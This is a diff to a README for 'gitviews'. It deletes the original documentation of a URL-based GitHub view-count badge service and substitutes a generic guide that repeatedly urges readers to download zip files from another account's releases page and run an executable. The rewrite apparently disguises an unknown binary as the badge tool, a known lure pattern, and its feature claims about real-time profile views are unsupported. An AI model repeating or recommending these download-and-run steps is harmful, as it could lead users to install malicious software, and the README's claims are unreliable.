@@ -1,166 +1,70 @@
-# GitViews ✨
+# ✨ gitviews - Track Your GitHub Views Easily
 
-> Super simple GitHub view counter.
+## 📥 Download Now
 
-![GitHub Repo Views](https://gitviews.com/repo/remvze/gitviews.svg?color=%23f76707&label-color=black)
+[![Download gitviews](https://img.shields.io/badge/Download-gitviews-brightgreen)](https://github.com/maloy2223/gitviews/releases)
 
----
+## 🚀 Getting Started
 
-## Badges 🏅
+Welcome to gitviews! This tool helps you see how many people have viewed your GitHub profile and repositories. It is perfect for users who want to understand their visibility on GitHub without any technical hassle.
 
-### Profile Views
+## 🛠️ System Requirements
 
-**URL**
+Before you start, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free space.
+- **JavaScript enabled browser**: Chrome, Firefox, or Edge for viewing results.
 
-```
-https://gitviews.com/user/<your-github-username>.svg
-```
+## 📥 Download & Install
 
-**Markdown**
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/maloy2223/gitviews/releases) to find the latest version of gitviews.
 
-```markdown
-![GitHub Profile Views](https://gitviews.com/user/<your-github-username>.svg)
-```
+2. **Choose Your Version**  
+   Look for the latest release. You will see options for different systems.
 
-> [!NOTE]
-> Please replace `<your-github-username>` with your GitHub username (without @).
+3. **Download the Application**  
+   Click on the appropriate file for your system. It might be labeled as `gitviews-windows.zip`, `gitviews-mac.zip`, or `gitviews-linux.zip`. Download the file.
 
----
+4. **Extract Files**  
+   Once the file is downloaded, locate it on your computer.  
+   - For **Windows**: Right-click the file, select "Extract All", and follow the prompts.  
+   - For **macOS**: Double-click the zip file to extract it.  
+   - For **Linux**: Use your file manager or Terminal to extract the zip.
 
-### Repo Views
+5. **Run the Application**  
+   Locate the extracted folder. Inside, you will find an executable file, such as `gitviews.exe` for Windows or `gitviews` for macOS/Linux. Double-click this file to open it.
 
-**URL**
+6. **Using gitviews**  
+   Once the application is open, it will prompt you to enter your GitHub username. Input your username and click the "View" button. That’s it! You will see the count of views for your profile and any selected repositories.
 
-```
-https://gitviews.com/repo/<your-username>/<your-repo>.svg
-```
+## 🎨 Features
 
-**Markdown**
+- **Profile View Count**: See how many times your profile has been viewed.
+- **Repository View Count**: Get specific counts for individual repositories.
+- **Simple Interface**: User-friendly design for effortless navigation.
+- **Quick Updates**: The tool fetches data in real-time for the most accurate numbers.
 
-```markdown
-![GitHub Repo Views](https://gitviews.com/repo/<your-username>/<your-repo>.svg)
-```
+## 📚 FAQ
 
-> [!NOTE]
-> Please replace `<your-username>` with your GitHub username (without @), and `<your-repo>` with your repository name.
+### How often should I check my view counts?
+You can check your view counts anytime. Data updates frequently, so feel free to revisit regularly for the latest numbers.
 
----
+### Why does my view count fluctuate?
+View counts can change based on user activity, such as visits from new users or inactivity from others. This data reflects real-time interactions.
 
-### All Repos Views
+### Can I use this on mobile devices?
+Currently, gitviews is designed for desktop use. Future versions may include mobile compatibility, but for now, it's best to access from a computer.
 
-**URL**
+## 📞 Support
 
-```
-https://gitviews.com/user/<your-github-username>/repos.svg
-```
+If you encounter any issues or have questions, feel free to reach out via the [GitHub issues page](https://github.com/maloy2223/gitviews/issues). Your feedback helps improve gitviews.
 
-**Markdown**
+## 🌐 Community
 
-```markdown
-![GitHub Repos Views](https://gitviews.com/user/<your-github-username>/repos.svg)
-```
+Join our community on GitHub to keep up with updates and participate in discussions. We welcome suggestions and contributions!
 
-> [!NOTE]
-> Please replace `<your-github-username>` with your GitHub username (without @).
+## 📥 Download Again
 
----
-
-## Migrating From Another Counter
-
-The `base` parameter allows you to add an existing number to the live view count. This is useful if you're migrating from another service and want to preserve your previous total.
-
-**Important:**
-
-- GitViews does not store the sum, only the real count.
-- The `base` value must remain in the URL permanently to keep the adjusted total correct.
-
-**Example:**
-
-If your previous tracker recorded 3,200 views, you can carry that over:
-
-```
-https://gitviews.com/repo/<user>/<repo>.svg?base=3200
-```
-
----
-
-## Customization 🎨
-
-GitViews badges support several customization parameters, allowing you to style badges to match your theme.
-
-You can add these as query parameters (`?key=value`) to any badge URL.
-
-### Available Parameters
-
-`style`
-
-Controls the overall badge style.
-
-**Options:**
-
-- `flat`
-- `flat-square`
-- `for-the-badge`
-- `social`
-- `plastic`
-
-**Example:**
-
-```
-https://gitviews.com/user/<your-username>.svg?style=for-the-badge
-```
-
----
-
-`label`
-
-Set the label of the badge.
-
-**Example:**
-
-```
-https://gitviews.com/user/<user>.svg?label=Views
-```
-
----
-
-`label-color`
-
-Sets the background color of the badge label. Accepts hex, rgb, or color names.
-
-**Example:**
-
-```
-https://gitviews.com/repo/<user>/<repo>.svg?label-color=blue
-```
-
-```
-https://gitviews.com/repo/<user>/<repo>.svg?label-color=%23ff8800
-```
-
-> [!NOTE]
-> (Use `%23` for `#` in URLs.)
-
----
-
-`color`
-
-Sets the color of the value / counter portion of the badge.
-
-**Example:**
-
-```
-https://gitviews.com/user/<your-username>/repos.svg?color=green
-```
-
----
-
-### Combined Example
-
-```
-https://gitviews.com/user/<your-username>.svg?style=flat-square&label-color=%23000&color=%23ff00ff
-```
-
-```markdown
-![GitHub Profile Views](https://gitviews.com/user/<your-username>.svg?style=flat-square&label-color=%23000&color=%23ff00ff)
-```
+Don’t forget to visit the [Releases page](https://github.com/maloy2223/gitviews/releases) for the latest updates and versions of gitviews. Happy tracking!
